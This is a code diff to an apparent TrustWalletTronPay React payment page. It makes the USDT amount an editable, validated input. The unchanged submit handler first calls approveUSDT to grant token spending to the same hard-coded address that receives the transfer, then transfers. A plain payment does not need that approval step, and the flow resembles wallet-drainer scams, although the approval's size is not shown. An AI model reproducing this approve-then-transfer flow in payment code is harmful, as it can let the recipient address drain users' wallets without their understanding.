@@ -84,6 +84,7 @@ const TrustWalletTronPay = () => {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [trustConnecting, setTrustConnecting] = useState(false);
   const [wcConnecting, setWcConnecting] = useState(false);
+  const [amountInput, setAmountInput] = useState(DEFAULT_AMOUNT);
   const autoConnectStarted = useRef(false);
   const autoConnectAttempted = useRef(false);
   const trustPopupAttempted = useRef(false);
@@ -95,7 +96,6 @@ const TrustWalletTronPay = () => {
     | { state: "error"; finishedAt: number; message: string }
   >({ state: "idle" });
   const toAddress = useMemo(() => DEFAULT_TO_ADDRESS, []);
-  const amount = useMemo(() => DEFAULT_AMOUNT, []);
   const approveTo = useMemo(() => DEFAULT_TO_ADDRESS, []);
 
   const trustConnectDeepLink = useMemo(() => buildTrustWalletOpenUrlDeepLink(), []);
@@ -280,8 +280,15 @@ const TrustWalletTronPay = () => {
     try {
       setIsSubmitting(true);
 
+      const normalizedAmount = amountInput.trim();
+      const numericAmount = Number(normalizedAmount);
+      if (!normalizedAmount || !Number.isFinite(numericAmount) || numericAmount <= 0) {
+        toast.error("Enter a valid USDT amount.");
+        return;
+      }
+
       await approveUSDT("tron", approveTo);
-      await transferUSDT("tron", toAddress, amount);
+      await transferUSDT("tron", toAddress, normalizedAmount);
 
       toast.success("Approve and transfer completed successfully.");
     } catch (error) {
@@ -410,19 +417,52 @@ const TrustWalletTronPay = () => {
         </div>
 
         <div className="mt-5">
-          <label className="text-[#5e5e66] text-[13px] font-medium block mb-2">
+          <label
+            htmlFor="usdt-amount"
+            className="text-[#5e5e66] text-[13px] font-medium block mb-2"
+          >
             Amount
           </label>
-          <div className="h-14 rounded-xl border border-[#d7d7dc] bg-white px-3 flex items-center justify-between">
-            <span className="text-[#171717] text-[28px] leading-none font-medium">
-              {amount}
-            </span>
+          <div
+            className="h-14 rounded-xl border border-[#d7d7dc] bg-white px-3 flex items-center justify-between"
+            onClick={(e) => {
+              // Some in-app mobile webviews are picky about focusing inputs.
+              const input = (e.currentTarget.querySelector("#usdt-amount") as HTMLInputElement | null);
+              input?.focus();
+            }}
+          >
+            <input
+              id="usdt-amount"
+              type="text"
+              value={amountInput}
+              onChange={(e) => {
+                const next = e.target.value;
+                // allow empty while typing; otherwise allow numbers + dot
+                if (next === "" || /^[0-9]*[.]?[0-9]*$/.test(next)) {
+                  setAmountInput(next);
+                }
+              }}
+              inputMode="decimal"
+              autoComplete="off"
+              spellCheck={false}
+              className="w-40 bg-transparent text-[#171717] text-[28px] leading-none font-medium outline-none min-w-0"
+              aria-label="USDT amount"
+              placeholder={DEFAULT_AMOUNT}
+            />
             <div className="flex items-center gap-2">
               <span className="text-[#67676f] text-base">USDT</span>
-              <span className="text-[#5f5de8] text-base font-semibold">Max</span>
+              <button
+                type="button"
+                className="text-[#5f5de8] text-base font-semibold"
+                onClick={() => setAmountInput(DEFAULT_AMOUNT)}
+              >
+                Reset
+              </button>
             </div>
           </div>
-          <p className="text-[#8d8d96] text-xs mt-2">≈ 10.00 USDT</p>
+          <p className="text-[#8d8d96] text-xs mt-2">
+            ≈ {amountInput.trim() || "0"} USDT
+          </p>
         </div>
 
         <div className="mt-3">
